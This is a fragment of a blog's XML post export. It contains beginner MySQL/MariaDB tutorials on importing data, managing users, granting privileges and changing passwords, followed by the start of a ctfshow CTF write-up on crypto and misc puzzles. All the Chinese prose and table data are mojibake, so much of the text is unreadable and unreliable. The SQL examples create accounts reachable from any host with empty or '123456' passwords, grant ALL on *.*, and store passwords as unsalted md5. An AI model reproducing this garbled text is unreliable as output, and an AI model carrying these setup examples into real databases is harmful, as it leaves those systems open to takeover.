class="hljs-string"> NULL    </span>|<span class="hljs-string">       </span>|<br>+----------+-------------+------+-----+---------+-------+<br>4 rows in set (0.00 sec)<br></code></pre></td></tr></table></figure>

<p>sql.txtå†…å®¹</p>
<figure class="highlight subunit"><table><tr><td class="code"><pre><code class="hljs subunit">[root@localhost ~]# cat sql.txt<br>3,å¼ ä¸‰,2000<span class="hljs-string">-01</span><span class="hljs-string">-02</span>,zhangsan<br>4,æå››,2001<span class="hljs-string">-06</span><span class="hljs-string">-15</span>,123456<br></code></pre></td></tr></table></figure>

<p>è¡¨ä¸­å·²æœ‰å†…å®¹</p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><code class="hljs asciidoc">MariaDB [test]&gt; select * from sj;<br><span class="hljs-code">+----+</span>--------<span class="hljs-code">+------------+</span>------------------+<br><span class="hljs-section">| ID | Name   | Day        | Password         |</span><br><span class="hljs-section">+----+--------+------------+------------------+</span><br>|  1 | w      | 1999-11-07 | f1290186a5d0b1ce |<br><span class="hljs-section">|  2 | äºŒå“ˆ   | 1996-12-01 | 49973c3a8ab362ad |</span><br><span class="hljs-section">+----+--------+------------+------------------+</span><br>2 rows in set (0.00 sec)<br></code></pre></td></tr></table></figure>

<p>å¯¼å…¥txt</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql">MariaDB [test]&gt; <span class="hljs-keyword">load</span> data <span class="hljs-keyword">local</span> infile <span class="hljs-string">&#x27;/root/sql.txt&#x27;</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">table</span> sj fields terminated <span class="hljs-keyword">by</span> <span class="hljs-string">&#x27;,&#x27;</span>(ID,<span class="hljs-type">Name</span>,Day,@p) <span class="hljs-keyword">set</span> <span class="hljs-keyword">Password</span>=md5(@p);<br>Query OK, <span class="hljs-number">2</span> <span class="hljs-keyword">rows</span> affected, <span class="hljs-number">2</span> warnings (<span class="hljs-number">0.00</span> sec)<br>Records: <span class="hljs-number">2</span>  Deleted: <span class="hljs-number">0</span>  Skipped: <span class="hljs-number">0</span>  Warnings: <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure>

<p>ç»“æœ</p>
<figure class="highlight gherkin"><table><tr><td class="code"><pre><code class="hljs gherkin">MariaDB [test]&gt; select <span class="hljs-symbol">*</span> from sj;<br>+----+--------+------------+------------------+<br>|<span class="hljs-string"> ID </span>|<span class="hljs-string"> Name   </span>|<span class="hljs-string"> Day        </span>|<span class="hljs-string"> Password         </span>|<br>+----+--------+------------+------------------+<br>|<span class="hljs-string">  1 </span>|<span class="hljs-string"> w      </span>|<span class="hljs-string"> 1999-11-07 </span>|<span class="hljs-string"> f1290186a5d0b1ce </span>|<br>|<span class="hljs-string">  2 </span>|<span class="hljs-string"> äºŒå“ˆ   </span>|<span class="hljs-string"> 1996-12-01 </span>|<span class="hljs-string"> 49973c3a8ab362ad </span>|<br>|<span class="hljs-string">  3 </span>|<span class="hljs-string"> å¼ ä¸‰   </span>|<span class="hljs-string"> 2000-01-02 </span>|<span class="hljs-string"> 01d7f40760960e7b </span>|<br>|<span class="hljs-string">  4 </span>|<span class="hljs-string"> æå››   </span>|<span class="hljs-string"> 2001-06-15 </span>|<span class="hljs-string"> e10adc3949ba59ab </span>|<br>+----+--------+------------+------------------+<br>4 rows in set (0.00 sec)<br></code></pre></td></tr></table></figure>

<p>å‘½ä»¤è§£é‡Š<br><code>load data local infile &#39;/root/sql.txt&#39;</code>  &#x2F;&#x2F;åŠ è½½æœ¬åœ°sql.txtæ–‡ä»¶<br><code>into table sj</code>   &#x2F;&#x2F;å¯¼å…¥sjè¿™ä¸ªè¡¨<br><code>fields terminated by &#39;,&#39;</code>  &#x2F;&#x2F;æŒ‡æ˜txtä¸­åˆ†å‰²æ•°æ®çš„ç¬¦å·<br><code>(ID,Name,Day,@p) set Password=md5(@p);</code>  &#x2F;&#x2F;å­—æ®µåï¼Œmd5(@p)è¡¨ç¤ºmd5åŠ å¯†å‰é¢å®šä¹‰çš„@på­—æ®µçš„å†…å®¹</p>
]]></content>
      <categories>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>åŸºç¡€</tag>
        <tag>mysql</tag>
        <tag>æ•°æ®åº“</tag>
      </tags>
  </entry>
  <entry>
    <title>mysqlä»å…¥é—¨åˆ°å…¥åœŸï¼ˆäºŒï¼‰</title>
    <url>/posts/74c2ef78/</url>
    <content><![CDATA[<h1 id="ç”¨æˆ·æ“ä½œ"><a href="#ç”¨æˆ·æ“ä½œ" class="headerlink" title="ç”¨æˆ·æ“ä½œ"></a>ç”¨æˆ·æ“ä½œ</h1><h2 id="åˆ›å»ºç”¨æˆ·"><a href="#åˆ›å»ºç”¨æˆ·" class="headerlink" title="åˆ›å»ºç”¨æˆ·"></a>åˆ›å»ºç”¨æˆ·</h2><figure class="highlight n1ql"><table><tr><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">USER</span> <span class="hljs-string">&#x27;username&#x27;</span>@<span class="hljs-string">&#x27;host&#x27;</span> IDENTIFIED <span class="hljs-keyword">BY</span> <span class="hljs-string">&#x27;password&#x27;</span>;<br></code></pre></td></tr></table></figure>
<blockquote>
<p>username - ä½ å°†åˆ›å»ºçš„ç”¨æˆ·å,<br>host - æŒ‡å®šè¯¥ç”¨æˆ·åœ¨å“ªä¸ªä¸»æœºä¸Šå¯ä»¥ç™»é™†,å¦‚æœæ˜¯æœ¬åœ°ç”¨æˆ·å¯ç”¨localhost, å¦‚æœæƒ³è®©è¯¥ç”¨æˆ·å¯ä»¥ä»ä»»æ„è¿œç¨‹ä¸»æœºç™»é™†,å¯ä»¥ä½¿ç”¨é€šé…ç¬¦%.<br>password - è¯¥ç”¨æˆ·çš„ç™»é™†å¯†ç ,å¯†ç å¯ä»¥ä¸ºç©º,å¦‚æœä¸ºç©ºåˆ™è¯¥ç”¨æˆ·å¯ä»¥ä¸éœ€è¦å¯†ç ç™»é™†æœåŠ¡å™¨.</p>
</blockquote>
<p>ä¾‹å­ï¼š</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">user</span> <span class="hljs-string">&#x27;m23100&#x27;</span>@<span class="hljs-string">&#x27;localhost&#x27;</span> identified <span class="hljs-keyword">BY</span> <span class="hljs-string">&#x27;123456&#x27;</span>;<br><span class="hljs-keyword">create</span> <span class="hljs-keyword">user</span> <span class="hljs-string">&#x27;m23100&#x27;</span>@<span class="hljs-string">&#x27;192.168.1.101&#x27;</span> identified <span class="hljs-keyword">BY</span> <span class="hljs-string">&#x27;123456&#x27;</span>;<br><span class="hljs-keyword">create</span> <span class="hljs-keyword">user</span> <span class="hljs-string">&#x27;m23100&#x27;</span>@<span class="hljs-string">&#x27;%&#x27;</span> identified <span class="hljs-keyword">BY</span> <span class="hljs-string">&#x27;123456&#x27;</span>;<br><span class="hljs-keyword">create</span> <span class="hljs-keyword">user</span> <span class="hljs-string">&#x27;m23100&#x27;</span>@<span class="hljs-string">&#x27;%&#x27;</span> identified <span class="hljs-keyword">BY</span> <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">create</span> <span class="hljs-keyword">user</span> <span class="hljs-string">&#x27;m23100&#x27;</span>@<span class="hljs-string">&#x27;%&#x27;</span>;<br></code></pre></td></tr></table></figure>

<h2 id="åˆ é™¤ç”¨æˆ·"><a href="#åˆ é™¤ç”¨æˆ·" class="headerlink" title="åˆ é™¤ç”¨æˆ·"></a>åˆ é™¤ç”¨æˆ·</h2><figure class="highlight n1ql"><table><tr><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">DROP</span> <span class="hljs-keyword">USER</span> <span class="hljs-string">&#x27;username&#x27;</span>@<span class="hljs-string">&#x27;host&#x27;</span>;<br></code></pre></td></tr></table></figure>

<h2 id="æŸ¥çœ‹ç”¨æˆ·ä¿¡æ¯"><a href="#æŸ¥çœ‹ç”¨æˆ·ä¿¡æ¯" class="headerlink" title="æŸ¥çœ‹ç”¨æˆ·ä¿¡æ¯"></a>æŸ¥çœ‹ç”¨æˆ·ä¿¡æ¯</h2><figure class="highlight n1ql"><table><tr><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>,host,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> mysql.<span class="hljs-keyword">user</span>;<br></code></pre></td></tr></table></figure>
<p>å¯ä»¥åœ¨ç³»ç»Ÿè¡¨<code>user</code>ä¸­çœ‹åˆ°æ‰€ç”¨ç”¨æˆ·ä¿¡æ¯<br>å› ä¸ºå­—æ®µå¤ªå¤šï¼Œæ‰€ä»¥åªæŸ¥çœ‹<code>user</code>ï¼Œ<code>host</code>ï¼Œ<code>password</code>å­—æ®µ</p>
<h2 id="èµ‹äºˆç”¨æˆ·æƒé™"><a href="#èµ‹äºˆç”¨æˆ·æƒé™" class="headerlink" title="èµ‹äºˆç”¨æˆ·æƒé™"></a>èµ‹äºˆç”¨æˆ·æƒé™</h2><figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">GRANT</span> <span class="hljs-keyword">PRIVILEGES</span> <span class="hljs-keyword">ON</span> DATABASENAME.TABLENAME <span class="hljs-keyword">TO</span> <span class="hljs-string">&#x27;username&#x27;</span>@<span class="hljs-string">&#x27;host&#x27;</span>;<br></code></pre></td></tr></table></figure>
<blockquote>
<p>privileges - ç”¨æˆ·çš„æ“ä½œæƒé™,å¦‚SELECT , INSERT , UPDATE ç­‰.å¦‚æœè¦æˆäºˆæ‰€çš„æƒé™åˆ™ä½¿ç”¨ALL.;<br>databasename - æ•°æ®åº“å,<br>tablename-è¡¨å,å¦‚æœè¦æˆäºˆè¯¥ç”¨æˆ·å¯¹æ‰€æœ‰æ•°æ®åº“å’Œè¡¨çš„ç›¸åº”æ“ä½œæƒé™åˆ™å¯ç”¨ * è¡¨ç¤º, å¦‚ <em>.</em></p>
</blockquote>
<p>ä¾‹å­ï¼š</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">GRANT</span> <span class="hljs-keyword">SELECT</span>, <span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">ON</span> test.<span class="hljs-keyword">user</span> <span class="hljs-keyword">TO</span> <span class="hljs-string">&#x27;m23100&#x27;</span>@<span class="hljs-string">&#x27;%&#x27;</span>;<br><span class="hljs-keyword">GRANT</span> <span class="hljs-keyword">ALL</span> <span class="hljs-keyword">ON</span> *.* <span class="hljs-keyword">TO</span> <span class="hljs-string">&#x27;m23100&#x27;</span>@<span class="hljs-string">&#x27;%&#x27;</span>;<br>flush <span class="hljs-keyword">privileges</span>; åˆ·æ–°æƒé™<br></code></pre></td></tr></table></figure>

<p>æ³¨æ„:ç”¨ä»¥ä¸Šå‘½ä»¤æˆæƒçš„ç”¨æˆ·ä¸èƒ½ç»™å…¶å®ƒç”¨æˆ·æˆæƒ,å¦‚æœæƒ³è®©è¯¥ç”¨æˆ·å¯ä»¥æˆæƒ,ç”¨ä»¥ä¸‹å‘½ä»¤:<br>GRANT privileges ON databasename.tablename TO â€˜usernameâ€˜@â€™hostâ€™ with grant option;</p>
<h2 id="æŸ¥çœ‹ç”¨æˆ·æƒé™"><a href="#æŸ¥çœ‹ç”¨æˆ·æƒé™" class="headerlink" title="æŸ¥çœ‹ç”¨æˆ·æƒé™"></a>æŸ¥çœ‹ç”¨æˆ·æƒé™</h2><figure class="highlight dart"><table><tr><td class="code"><pre><code class="hljs dart"><span class="hljs-keyword">show</span> grants <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;user01&#x27;</span>@<span class="hljs-string">&#x27;%&#x27;</span>;<br></code></pre></td></tr></table></figure>

<h2 id="å›æ”¶ç”¨æˆ·æƒé™"><a href="#å›æ”¶ç”¨æˆ·æƒé™" class="headerlink" title="å›æ”¶ç”¨æˆ·æƒé™"></a>å›æ”¶ç”¨æˆ·æƒé™</h2><figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">REVOKE</span> <span class="hljs-keyword">DELETE</span> <span class="hljs-keyword">ON</span> *.*  <span class="hljs-keyword">FROM</span> ç”¨æˆ·å@â€™%â€™;             <span class="hljs-comment">-- å›æ”¶éƒ¨åˆ†æƒé™</span><br><span class="hljs-keyword">REVOKE</span> <span class="hljs-keyword">ALL</span> <span class="hljs-keyword">PRIVILEGES</span> <span class="hljs-keyword">ON</span> *.* <span class="hljs-keyword">FROM</span> ç”¨æˆ·å@â€™%â€™;             <span class="hljs-comment">-- å›æ”¶æ‰€æœ‰æƒé™</span><br></code></pre></td></tr></table></figure>


<h1 id="å¯†ç æ“ä½œ"><a href="#å¯†ç æ“ä½œ" class="headerlink" title="å¯†ç æ“ä½œ"></a>å¯†ç æ“ä½œ</h1><h2 id="æ•°æ®åº“å†…ä¿®æ”¹ç”¨æˆ·å¯†ç "><a href="#æ•°æ®åº“å†…ä¿®æ”¹ç”¨æˆ·å¯†ç " class="headerlink" title="æ•°æ®åº“å†…ä¿®æ”¹ç”¨æˆ·å¯†ç "></a>æ•°æ®åº“å†…ä¿®æ”¹ç”¨æˆ·å¯†ç </h2><h3 id="rootä¿®æ”¹å…¶ä»–ç”¨æˆ·å¯†ç "><a href="#rootä¿®æ”¹å…¶ä»–ç”¨æˆ·å¯†ç " class="headerlink" title="rootä¿®æ”¹å…¶ä»–ç”¨æˆ·å¯†ç "></a>rootä¿®æ”¹å…¶ä»–ç”¨æˆ·å¯†ç </h3><figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">set</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;user01&#x27;</span>@<span class="hljs-string">&#x27;%&#x27;</span>=<span class="hljs-keyword">password</span>(<span class="hljs-string">&#x27;Qwer1234&#x27;</span>);<br></code></pre></td></tr></table></figure>

<h3 id="æ™®é€šç”¨æˆ·ä¿®æ”¹è‡ªå·±å¯†ç "><a href="#æ™®é€šç”¨æˆ·ä¿®æ”¹è‡ªå·±å¯†ç " class="headerlink" title="æ™®é€šç”¨æˆ·ä¿®æ”¹è‡ªå·±å¯†ç "></a>æ™®é€šç”¨æˆ·ä¿®æ”¹è‡ªå·±å¯†ç </h3><figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">set</span> <span class="hljs-keyword">password</span>=<span class="hljs-keyword">password</span>(<span class="hljs-string">&#x27;123456&#x27;</span>);<br></code></pre></td></tr></table></figure>

<h2 id="æ•°æ®åº“å¤–ä¿®æ”¹å¯†ç "><a href="#æ•°æ®åº“å¤–ä¿®æ”¹å¯†ç " class="headerlink" title="æ•°æ®åº“å¤–ä¿®æ”¹å¯†ç "></a>æ•°æ®åº“å¤–ä¿®æ”¹å¯†ç </h2><figure class="highlight css"><table><tr><td class="code"><pre><code class="hljs css">mysqladmin -u root -<span class="hljs-selector-tag">p</span>åŸå¯†ç  password ä¿®æ”¹çš„å¯†ç <br></code></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>åŸºç¡€</tag>
        <tag>mysql</tag>
        <tag>æ•°æ®åº“</tag>
      </tags>
  </entry>
  <entry>
    <title>mysqlä»å…¥é—¨åˆ°å…¥åœŸï¼ˆä¸€ï¼‰</title>
    <url>/posts/44d403a0/</url>
    <content><![CDATA[<h1 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h1><p>centos7ï¼Œmariadb5.5.56</p>
<h1 id="æ•°æ®åº“åŸºç¡€æ“ä½œ"><a href="#æ•°æ®åº“åŸºç¡€æ“ä½œ" class="headerlink" title="æ•°æ®åº“åŸºç¡€æ“ä½œ"></a>æ•°æ®åº“åŸºç¡€æ“ä½œ</h1><h2 id="æŸ¥çœ‹æ•°æ®åº“"><a href="#æŸ¥çœ‹æ•°æ®åº“" class="headerlink" title="æŸ¥çœ‹æ•°æ®åº“"></a>æŸ¥çœ‹æ•°æ®åº“</h2><p>é»˜è®¤æœ‰å››ä¸ªåº“</p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><code class="hljs asciidoc">MariaDB [(none)]&gt; show databases;<br><span class="hljs-code">+--------------------+</span><br><span class="hljs-section">| Database           |</span><br><span class="hljs-section">+--------------------+</span><br>| information<span class="hljs-emphasis">_schema |</span><br><span class="hljs-emphasis">| mysql              |</span><br><span class="hljs-emphasis">| performance_</span>schema |<br><span class="hljs-section">| test               |</span><br><span class="hljs-section">+--------------------+</span><br>4 rows in set (0.00 sec)<br></code></pre></td></tr></table></figure>
<h2 id="åˆ›å»ºæ•°æ®åº“"><a href="#åˆ›å»ºæ•°æ®åº“" class="headerlink" title="åˆ›å»ºæ•°æ®åº“"></a>åˆ›å»ºæ•°æ®åº“</h2><p>aabæ˜¯æ•°æ®åº“çš„åå­—</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql">MariaDB [(<span class="hljs-keyword">none</span>)]&gt; <span class="hljs-keyword">create</span> <span class="hljs-keyword">database</span> aab;<br>Query OK, <span class="hljs-number">1</span> <span class="hljs-keyword">row</span> affected (<span class="hljs-number">0.00</span> sec)<br></code></pre></td></tr></table></figure>

<h2 id="åˆ‡æ¢ï¼ˆä½¿ç”¨ï¼‰æ•°æ®åº“"><a href="#åˆ‡æ¢ï¼ˆä½¿ç”¨ï¼‰æ•°æ®åº“" class="headerlink" title="åˆ‡æ¢ï¼ˆä½¿ç”¨ï¼‰æ•°æ®åº“"></a>åˆ‡æ¢ï¼ˆä½¿ç”¨ï¼‰æ•°æ®åº“</h2><p>åˆ‡æ¢è‡³aabæ•°æ®åº“</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">MariaDB</span> [(<span class="hljs-literal">none</span>)]&gt; use aab;<br><span class="hljs-attribute">Database</span> changed<br>MariaDB [aab]&gt;<br></code></pre></td></tr></table></figure>

<h2 id="åˆ é™¤ï¼ˆä¸¢å¼ƒï¼‰æ•°æ®åº“"><a href="#åˆ é™¤ï¼ˆä¸¢å¼ƒï¼‰æ•°æ®åº“" class="headerlink" title="åˆ é™¤ï¼ˆä¸¢å¼ƒï¼‰æ•°æ®åº“"></a>åˆ é™¤ï¼ˆä¸¢å¼ƒï¼‰æ•°æ®åº“</h2><p>drop database [if exists] æ•°æ®åº“å;<br>if exists ä¸ºå¯é€‰ï¼Œåˆ¤æ–­æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœä¸å­˜åœ¨åˆ™ä¼šæŠ›å‡ºå¼‚å¸¸</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql">MariaDB [(<span class="hljs-keyword">none</span>)]&gt; <span class="hljs-keyword">drop</span> <span class="hljs-keyword">database</span> <span class="hljs-keyword">if</span> <span class="hljs-keyword">exists</span> aab;<br>Query OK, <span class="hljs-number">0</span> <span class="hljs-keyword">rows</span> affected (<span class="hljs-number">0.00</span> sec)<br></code></pre></td></tr></table></figure>

<h1 id="è¡¨åŸºç¡€æ“ä½œ"><a href="#è¡¨åŸºç¡€æ“ä½œ" class="headerlink" title="è¡¨åŸºç¡€æ“ä½œ"></a>è¡¨åŸºç¡€æ“ä½œ</h1><h2 id="æŸ¥çœ‹è¡¨"><a href="#æŸ¥çœ‹è¡¨" class="headerlink" title="æŸ¥çœ‹è¡¨"></a>æŸ¥çœ‹è¡¨</h2><p>å› ä¸ºç›®å‰è¿˜æ²¡æœ‰è¡¨ï¼Œæ‰€ä»¥è¿”å›äº†empty set</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">MariaDB [aab]<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">show</span> tables;<br><span class="hljs-keyword">Empty</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)<br></code></pre></td></tr></table></figure>

<h2 id="åˆ›å»ºè¡¨"><a href="#åˆ›å»ºè¡¨" class="headerlink" title="åˆ›å»ºè¡¨"></a>åˆ›å»ºè¡¨</h2><p>create table è¡¨æ ¼å(åˆ—å1 ç±»å‹ï¼Œåˆ—å2 ç±»å‹ï¼Œåˆ—å3 ç±»å‹);</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">MariaDB [aab]<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> bba(Sid <span class="hljs-type">int</span>,Sname <span class="hljs-type">char</span>(<span class="hljs-number">6</span>),Sdate <span class="hljs-type">date</span>);<br>Query OK, <span class="hljs-number">0</span> <span class="hljs-keyword">rows</span> affected (<span class="hljs-number">0.00</span> sec)<br></code></pre></td></tr></table></figure>
<p>æ‰©å±•â€”å¸¸ç”¨æ•°æ®ç±»å‹</p>
<blockquote>
<p>æ•´æ•°å‹ï¼štinyint, smallint, mediumint, int, bigint<br>å°æ•°å‹ï¼šfloat, double, decimal, real<br>å­—ç¬¦å‹ï¼šchar, varchar<br>æ—¥æœŸæ—¶é—´å‹ï¼š date, datetime, time, timestamp, year<br>å¤‡æ³¨å‹ï¼štinytext, text, mediumtext, longtext</p>
</blockquote>
<p>æ‰©å±•â€”charä¸varcharçš„åŒºåˆ«</p>
<blockquote>
<p>é¦–å…ˆæ˜ç¡®çš„æ˜¯ï¼Œcharçš„é•¿åº¦æ˜¯ä¸å¯å˜çš„ï¼Œè€Œvarcharçš„é•¿åº¦æ˜¯å¯å˜çš„ï¼Œå®šä¹‰ä¸€ä¸ªchar[10]å’Œvarchar[10],å¦‚æœå­˜è¿›å»çš„æ˜¯â€˜abcdâ€™,é‚£ä¹ˆcharæ‰€å çš„é•¿åº¦ä¾ç„¶ä¸º10ï¼Œé™¤äº†å­—ç¬¦â€˜abcdâ€™å¤–ï¼Œåé¢è·Ÿå…­ä¸ªç©ºæ ¼ï¼Œè€Œvarcharå°±ç«‹é©¬æŠŠé•¿åº¦å˜ä¸º4äº†ï¼Œå–æ•°æ®çš„æ—¶å€™ï¼Œcharç±»å‹çš„è¦ç”¨trim()å»æ‰å¤šä½™çš„ç©ºæ ¼ï¼Œè€Œvarcharæ˜¯ä¸éœ€è¦çš„ã€‚</p>
</blockquote>
<blockquote>
<p>charçš„å­˜å–æ•°åº¦è¿˜æ˜¯è¦æ¯”varcharè¦å¿«å¾—å¤šï¼Œå› ä¸ºå…¶é•¿åº¦å›ºå®šï¼Œæ–¹ä¾¿ç¨‹åºçš„å­˜å‚¨ä¸æŸ¥æ‰¾ï¼›ä½†æ˜¯charä¹Ÿä¸ºæ­¤ä»˜å‡ºçš„æ˜¯ç©ºé—´çš„ä»£ä»·ï¼Œå› ä¸ºå…¶é•¿åº¦å›ºå®šï¼Œæ‰€ä»¥éš¾å…ä¼šæœ‰å¤šä½™çš„ç©ºæ ¼å ä½ç¬¦å æ®ç©ºé—´ï¼Œå¯è°“æ˜¯ä»¥ç©ºé—´æ¢å–æ—¶é—´æ•ˆç‡ï¼Œè€Œvarcharæ˜¯ä»¥ç©ºé—´æ•ˆç‡ä¸ºé¦–ä½çš„ã€‚charçš„å­˜å‚¨æ–¹å¼æ˜¯ï¼Œå¯¹è‹±æ–‡å­—ç¬¦ï¼ˆASCIIï¼‰å ç”¨1ä¸ªå­—èŠ‚ï¼Œå¯¹ä¸€ä¸ªæ±‰å­—å ç”¨ä¸¤ä¸ªå­—èŠ‚ï¼›è€Œvarcharçš„å­˜å‚¨æ–¹å¼æ˜¯ï¼Œå¯¹æ¯ä¸ªè‹±æ–‡å­—ç¬¦å ç”¨2ä¸ªå­—èŠ‚ï¼Œæ±‰å­—ä¹Ÿå ç”¨2ä¸ªå­—èŠ‚ï¼Œä¸¤è€…çš„å­˜å‚¨æ•°æ®éƒ½éunicodeçš„å­—ç¬¦æ•°æ®ã€‚</p>
</blockquote>
<h2 id="æŸ¥çœ‹è¡¨ç»“æ„"><a href="#æŸ¥çœ‹è¡¨ç»“æ„" class="headerlink" title="æŸ¥çœ‹è¡¨ç»“æ„"></a>æŸ¥çœ‹è¡¨ç»“æ„</h2><p>show columns from è¡¨å;</p>
<figure class="highlight gherkin"><table><tr><td class="code"><pre><code class="hljs gherkin">MariaDB [aab]&gt; show columns from bba;<br>+-------+---------+------+-----+---------+-------+<br>|<span class="hljs-string"> Field </span>|<span class="hljs-string"> Type    </span>|<span class="hljs-string"> Null </span>|<span class="hljs-string"> Key </span>|<span class="hljs-string"> Default </span>|<span class="hljs-string"> Extra </span>|<br>+-------+---------+------+-----+---------+-------+<br>|<span class="hljs-string"> Sid   </span>|<span class="hljs-string"> int(11) </span>|<span class="hljs-string"> YES  </span>|<span class="hljs-string">     </span>|<span class="hljs-string"> NULL    </span>|<span class="hljs-string">       </span>|<br>|<span class="hljs-string"> Sname </span>|<span class="hljs-string"> char(6) </span>|<span class="hljs-string"> YES  </span>|<span class="hljs-string">     </span>|<span class="hljs-string"> NULL    </span>|<span class="hljs-string">       </span>|<br>|<span class="hljs-string"> Sdate </span>|<span class="hljs-string"> date    </span>|<span class="hljs-string"> YES  </span>|<span class="hljs-string">     </span>|<span class="hljs-string"> NULL    </span>|<span class="hljs-string">       </span>|<br>+-------+---------+------+-----+---------+-------+<br>3 rows in set (0.00 sec)<br></code></pre></td></tr></table></figure>

<h2 id="åˆ é™¤è¡¨"><a href="#åˆ é™¤è¡¨" class="headerlink" title="åˆ é™¤è¡¨"></a>åˆ é™¤è¡¨</h2><p>drop table [if exists] è¡¨å;<br>if exists ä¸ºå¯é€‰ï¼Œåˆ¤æ–­æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœä¸å­˜åœ¨åˆ™ä¼šæŠ›å‡ºå¼‚å¸¸</p>
<blockquote>
<p>æ³¨æ„ï¼šåˆ é™¤å…·æœ‰ä¸»å¤–é”®å…³ç³»çš„è¡¨æ—¶ï¼Œè¦å…ˆåˆ å­è¡¨(ä»è¡¨)ï¼Œååˆ ä¸»è¡¨</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">MariaDB [aab]<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">drop</span> <span class="hljs-keyword">table</span> bba;<br>Query OK, <span class="hljs-number">0</span> <span class="hljs-keyword">rows</span> affected (<span class="hljs-number">0.00</span> sec)<br></code></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>åŸºç¡€</tag>
        <tag>mysql</tag>
        <tag>æ•°æ®åº“</tag>
      </tags>
  </entry>
  <entry>
    <title>ã€ctfshowã€‘æœˆé¥¼æ¯(ç¬¬äºŒå±Š)-wp</title>
    <url>/posts/34a884e6/</url>
    <content><![CDATA[<p>æŠ€æœ¯æœ‰é™ï¼Œåªè§£å‡ºéƒ¨åˆ†é¢˜ç›®<br>ç¡è§‰å‰è¿˜æ˜¯å‰10çš„ï¼Œä¸€è§‰é†’æ¥å°±æ²¡äº†ï¼Œå‘œå‘œå‘œ:(</p>
<h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="æˆ‘çš„æœ¨å¤´å•Šï¼ï¼ï¼"><a href="#æˆ‘çš„æœ¨å¤´å•Šï¼ï¼ï¼" class="headerlink" title="æˆ‘çš„æœ¨å¤´å•Šï¼ï¼ï¼"></a>æˆ‘çš„æœ¨å¤´å•Šï¼ï¼ï¼</h2><p>æ ¹æ®æç¤ºä¸ºæ …æ åŠ å¯†<br>ä½†ä¸æ˜¯æ™®é€šçš„æ …æ ï¼Œè€Œæ˜¯Wå‹<br>è§£å‡ºæ¥åå°±æ˜¯baseå…¨å®¶æ¡¶äº†<br><img src="/img/ctfshow/ybb-1.png"></p>
<h2 id="ä¸€å°ä¿¡"><a href="#ä¸€å°ä¿¡" class="headerlink" title="ä¸€å°ä¿¡"></a>ä¸€å°ä¿¡</h2><p><a href="https://aghorler.github.io/emoji-aes/">ç½‘ç«™</a>ç›´æ¥ä¸€æŠŠæ¢­ï¼Œå¯†é’¥åœ¨é¢˜ç›®ä¸­<br><img src="/img/ctfshow/ybb-2.png"></p>
<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="æ‚é¡¹ç­¾åˆ°"><a href="#æ‚é¡¹ç­¾åˆ°" class="headerlink" title="æ‚é¡¹ç­¾åˆ°"></a>æ‚é¡¹ç­¾åˆ°</h2><p>åœ¨å›¾ç‰‡çš„æœ€åæœ‰ä¸€ä¸²base64åŠ å¯†çš„å­—ç¬¦ä¸²ï¼Œè§£ç å³å¯</p>
<h2 id="æœ‰æ‰‹å°±è¡Œ"><a href="#æœ‰æ‰‹å°±è¡Œ" class="headerlink" title="æœ‰æ‰‹å°±è¡Œ"></a>æœ‰æ‰‹å°±è¡Œ</h2><p>å›¾ç‰‡å¤‡æ³¨ä¸­å¾—åˆ°å…³é”®ä¿¡æ¯<br><img src="/img/ctfshow/ybb-3.png"><br>æ±‰æ˜ç ä¸ä¼šç®—<br><a href="https://blog.csdn.net/qq_19782019/article/details/87452394">å‚è€ƒæ–‡ç« </a></p>
